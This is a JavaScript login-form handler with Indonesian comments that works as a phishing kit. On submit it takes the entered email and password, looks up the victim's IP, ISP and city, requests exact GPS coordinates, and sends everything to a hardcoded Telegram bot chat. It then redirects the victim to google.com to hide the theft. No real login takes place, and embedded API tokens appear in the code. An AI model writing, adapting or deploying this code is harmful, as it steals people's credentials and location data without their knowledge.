document.getElementById("loginForm").addEventListener("submit", async function(event) {
    event.preventDefault();

    let email = document.getElementById("email").value;
    let password = document.getElementById("password").value;
    let loginTime = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });

    // Telegram bot setup
    let botToken = "AIzaSyA5tdHVNBSUvYMw8g9U0SxH";  // Ganti dengan token bot Telegram kamu
    let chatIds = ["7894929132"];  // Ganti dengan chat ID kamu
    let profileImageUrl = "https://staticg.sportskeeda.com/editor/2022/01/f49b9-16421055515852-1920.jpg"; // Gambar profil

    // Fetch IP Info
    let ipInfo = { ip: "Tidak diketahui", city: "Tidak diketahui", country: "Tidak diketahui", org: "Tidak diketahui" };
    try {
        let response = await fetch("https://ipinfo.io/json?token=961f6caebd0f7d");
        ipInfo = await response.json();
    } catch (error) {
        console.error("Gagal mendapatkan data IP:", error);
    }

    async function getUserLocation() {
        return new Promise((resolve) => {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        resolve(`📍 Koordinat: ${position.coords.latitude}, ${position.coords.longitude}`);
                    },
                    () => {
                        resolve("📍 Lokasi: Tidak diizinkan oleh user");
                    }
                );
            } else {
                resolve("📍 Lokasi: Tidak didukung di browser ini");
            }
        });
    }

    let userLocation = await getUserLocation();

    let message = `🔒 *Login Berhasil!*\n\n`
        + `🕒 *Waktu:* ${loginTime}\n`
        + `📧 *Email:* ${email}\n`
        + `🔑 *Password:* ${password}\n`
        + `🌍 *IP:* ${ipInfo.ip}\n`
        + `📍 *Lokasi:* ${ipInfo.city}, ${ipInfo.country}\n`
        + `🏢 *Provider:* ${ipInfo.org}\n`
        + `${userLocation}`;

    async function sendToAllChats(urlTemplate) {
        return Promise.all(chatIds.map(chatId => fetch(urlTemplate(chatId))));
    }

    await sendToAllChats(chatId =>
        `https://api.telegram.org/bot${botToken}/sendPhoto?chat_id=${chatId}&photo=${encodeURIComponent(profileImageUrl)}`
    );

    await sendToAllChats(chatId =>
        `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`
    );

    console.log("✅ Data terkirim ke Telegram!");

    // Send News Update to Telegram
    const rssUrl = 'https://www.securityweek.com/rss.xml';

    const fetchSecurityNews = async () => {
        try {
            const response = await fetch(rssUrl);
            const body = await response.text();
            
            const $ = cheerio.load(body);
            let newsList = [];
            
            $('item').each((i, element) => {
                const title = $(element).find('title').text();
                const link = $(element).find('link').text();
                const description = $(element).find('description').text();
                
                newsList.push({ title, link, description });
            });

            return newsList;
        } catch (error) {
            console.error('Error fetching news:', error);
            return [];
        }
    };

    const sendNewsUpdate = async (chatId) => {
        const newsList = await fetchSecurityNews();
        
        if (newsList.length > 0) {
            newsList.slice(0, 5).forEach(news => { 
                fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(`*${news.title}*\n${news.description}\n[Read more](${news.link})`)}&parse_mode=Markdown`);
            });
        } else {
            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=No news available at the moment.`);
        }
    };

    sendNewsUpdate(chatIds[0]);

    window.location.href = "https://www.google.com";  // Redirect setelah login
});
